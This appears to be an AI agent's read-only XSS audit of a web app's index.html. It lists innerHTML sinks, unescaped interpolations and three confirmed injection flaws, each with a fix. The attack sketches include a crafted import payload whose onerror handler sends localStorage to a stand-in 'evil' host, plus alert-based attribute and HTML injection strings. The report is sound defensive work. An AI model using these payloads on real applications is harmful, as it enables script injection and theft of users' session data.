# Beta XSS / escaping scan — `index.html`

Read-only survey for beta-readiness item **R6**. No code was changed.
Task `t-beta-esc-scan`, agent `worker-esc-scan`, 2026-09-05.

## Method

`esc()` is defined once, at **index.html:7798**:

```js
const esc=s=>String(s??"").replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
```

It escapes `&  <  >  "` and **not** `'` or `` ` ``. It is the only encoder in the
file — there is no `escAttr`, `escapeHtml` or sanitiser anywhere.

Rather than eyeballing 186 `innerHTML` sites, I ran a throwaway JS scanner over
the file that (a) tokenises the script to find all 644 template literals,
handling nesting and strings, (b) keeps only the 322 that emit HTML, and
(c) walks each one as an HTML state machine so every `${…}` is tagged with its
real context — text, double-quoted attribute, single-quoted attribute, or bare
attribute position — and with whether the expression is wrapped in `esc()`.
Sites the scanner flagged were then read individually to confirm the data source.

## Sink inventory

| Sink | Count | Verdict |
|---|---|---|
| `innerHTML` | 186 | surveyed below |
| `outerHTML` | 1 (13158) | static — `hRibbonHtml()`, no user data |
| `insertAdjacentHTML` | 1 (20330) | static literal string |
| `document.write` / `srcdoc` | 0 | — |
| inline `on*=` handlers with interpolation | **0** | see note |

### The single-quote worry is mostly a non-issue

R6's headline concern was that `esc()` leaves `'` alone. In practice the app
never builds a single-quoted HTML attribute, and — more importantly — it has
**zero inline event handlers**. Every interactive element uses a `data-*`
attribute plus a delegated `document.addEventListener("click", …)`. The classic
`onclick="fn('${esc(name)}')"` break-out, which `esc()` would *not* stop, does
not exist here. `esc()`'s missing quote should still be fixed (below), but it is
hardening, not a live hole.

## Interpolation census (1077 sites in HTML-producing templates)

| Context | escaped | partially escaped | unescaped |
|---|---|---|---|
| Text content | 270 | 130 | 285 |
| Double-quoted attribute | 88 | 2 | 265 |
| Single-quoted attribute | — | — | **0** |
| Bare attribute position | — | — | 37 |

## CONFIRMED-UNESCAPED

All three require attacker-influenced data to reach state. The realistic
delivery vehicle is **import / restore**: `readImport()` (21495) does
`migrate(Object.assign(seed(), d))` on parsed JSON with **no per-field
validation** — it checks only that `subjects`/`products`/`events` are arrays.
`readImportPlants()` (21583) and the Firestore `onSnapshot` ingest (24273–24367)
are equally unvalidated. So a shared or downloaded backup file is a working
XSS delivery mechanism for every site below.

### 1. Photo data URLs go into `src="…"` unescaped — 10 sites

Lines **8653, 8924, 13347, 13361, 13382, 13590, 13633, 20887, 21217, 27152**.

```js
// index.html:13382
${ph?`<img class="tile-img" src="${ph.data}" alt="">` : …}
```

*Data source* — `S.photos[].data`, normally a `FileReader` base64 data URL, but
`d.photos` is accepted verbatim on import (see `migrate`, 7744).

*Attack sketch* — an import file containing
`{"photos":[{"id":"p1","subjectId":"s1","data":"x\" onerror=\"fetch('//evil/'+localStorage.pb)"}]}`
breaks out of the `src` attribute the moment the plant grid renders. `onerror`
fires because the src is invalid. Full script execution in app origin, with
access to `localStorage` and the signed-in Firebase session.

*Fix* — `src="${esc(ph.data)}"` at each of the 10 sites. Better still, gate on a
data-URL test the way `TB.safeUrl` already gates links:
`const safeImg=d=>/^data:image\/(png|jpe?g|webp|gif);base64,[A-Za-z0-9+/=]+$/.test(d||"")?d:"";`

### 2. Record ids and stored scalars in double-quoted attributes — ~118 sites

Lines include **8189, 8652, 8768, 10623, 11785–11888, 12276, 12835, 13063,
13103, 18709, 19202, 27145**, and the rest of the `data-*` family.

```js
// index.html:8652
<button type="button" class="tile" data-open-plant="${p.id}">
// index.html:11886
<input ... value="${b.time||""}">
```

*Data source* — locally these are `uid()` output and `<input type=number>`
values, so they are safe in normal operation. Under import they are arbitrary
attacker strings.

*Attack sketch* — a subject with
`"id": "x\" onmouseover=\"alert(document.domain)"` injects an attribute onto the
plant tile; hovering the tile executes it. No user confirmation beyond accepting
the import.

*Fix* — wrap in `esc()`. As a single defensive change instead of 118 edits,
sanitise ids at the trust boundary in `migrate()`:
`const cleanId=v=>String(v??"").replace(/[^\w:-]/g,"");` applied to every
`.id` / `.subjectId` / `.studentId` as state is loaded.

### 3. Routine name rendered unescaped — 1 site

**index.html:8648**, reached from 8662.

```js
const line=(k,ev,st)=>`<div class="pline">
  <span class="pill ${st.cls}">${st.text}</span>
  <span class="pline-k">${k}</span>          // <-- k is r.name, not escaped
…
${rs.map(r=>{const ev=lastEvent(r.id); return line(r.name, ev, dueState(…));}).join("")}
```

*Data source* — `S.routines[].name`. Written by `set(kind,label,every)` at 21129
and, critically, spread in wholesale from an import file at **21614**
(`S.routines.push(...newRoutines)`).

*Attack sketch* — an imported routine named
`<img src=x onerror=alert(1)>` executes as soon as the plant list renders. This
is direct HTML-context injection, so no attribute break-out is even needed.

*Why this one is clearly a slip, not a decision* — the identical `pline` markup
is written three other times in the file and escapes every time: **13611**
(`${esc(r.name)}`), **13387** (`${esc(t(rName(w.r))…)}`) and the sibling button
at **8664** (`${esc(DID[r.kind]||r.name)}`) inside the very same template.

*Fix* — `<span class="pline-k">${esc(k)}</span>` at 8648.

## PROBABLY-SAFE-BUT-CHECK

Read and cleared, but worth a second opinion if the data model shifts:

- **`href="${esc(m.url)}"`** (18924, 19028) — `esc()` alone would *not* stop
  `javascript:`, but both sites are guarded by `TB.safeUrl(m.url)` (6367), which
  scheme-checks. Correct today; the guard must not be dropped.
- **`rich()`** (7929-ish) — `esc(t(str)).replace(/\*\*(.+?)\*\*/g,"<b>$1</b>")`.
  Escapes first, then re-introduces only `<b>`. Safe, and safe by ordering — if
  anyone reverses those two operations it becomes an injection.
- **`spLabel()` (20927), `pplMark()` (12278-ish), `barList()` (18186),
  `loreHtml()` (17784), `statCell()`, `columns()`** — all escape every leaf
  before splicing in `<mark>`/`<b>`. Verified individually.
- **`ppSafeColor()`** (11567) — regex-validated hex or a CSS var. Good.
- **`TB_COLOR_HEX[s.color]||"#999"`** (18576, 18710, 12861) — lookup table, a
  miss falls through to a literal. Good.
- **37 bare-attribute-position interpolations** — every one is a ternary that
  yields a string literal (`${s.done?" checked":""}`, `${cls?\` class="${cls}"\`:""}`).
  No user data reaches attribute-name position. Re-check if any becomes dynamic.
- **`t()`** (7808) — returns `CS[k] || s` from a static table. Not a data path.

## SAFE-BY-CONSTRUCTION

- **490** interpolations are explicitly `esc()`-wrapped (358 at the outermost
  call, 132 escaped at each leaf of a nested template).
- **120** are ternaries or in-tag flags whose every branch is a string literal.
- The remainder of the "unescaped" column is computed numerics
  (`${Math.round(x/y*100)}%`, `${V.toFixed(2)}`, `${pct}`) and nested-template
  composition already counted as escaped at the leaf.
- 0 single-quoted attribute contexts; 0 inline event handlers; 0 `document.write`.

## Proposed hardening for `esc()`

Add `'` and `` ` `` so the function is correct in every quoting context, not
just the double-quoted one. Five lines, no call-site changes:

```js
const ESC_MAP={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;","`":"&#96;"};
/* Single quote and backtick matter the moment anything is written into a
   single-quoted attribute or a nested template — cheap now, unfindable later. */
const esc=s=>String(s??"").replace(/[&<>"'`]/g,c=>ESC_MAP[c]);
```

Note this is defence in depth only: it fixes none of the three confirmed
findings, all of which are missing `esc()` calls rather than an insufficient one.

## Suggested order of work

1. **8648** — one character-level edit, direct HTML injection, clearly a slip.
2. **The 10 photo `src`** — highest impact, self-contained.
3. **Id sanitisation in `migrate()`** — one choke point instead of 118 edits.
4. **The `esc()` widening** — hardening, ship whenever.
